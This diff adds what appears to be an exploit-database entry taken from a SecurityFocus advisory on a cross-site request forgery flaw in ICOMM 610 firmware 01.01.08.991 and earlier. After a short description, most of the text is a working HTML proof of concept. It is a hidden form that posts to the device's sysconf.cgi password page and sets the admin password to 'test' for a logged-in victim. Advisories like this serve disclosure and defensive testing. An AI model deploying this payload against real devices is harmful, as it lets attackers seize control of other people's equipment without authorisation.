@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/66593/info
+
+ICOMM 610 is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks.
+
+ICOMM 610 01.01.08.991 and prior are vulnerable. 
+
+<html>
+  <!-- CSRF PoC --->
+  <body>
+    <form action="http://www.example.com/cgi-bin/sysconf.cgi?page=personalize_password.asp&sid=rjPd8QVqvRGX×tamp=1396366701157" method="POST">
+      <input type="hidden" name="PasswdEnable" value="on" />
+      <input type="hidden" name="New_Passwd" value="test" />
+      <input type="hidden" name="Confirm_New_Passwd" value="test" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
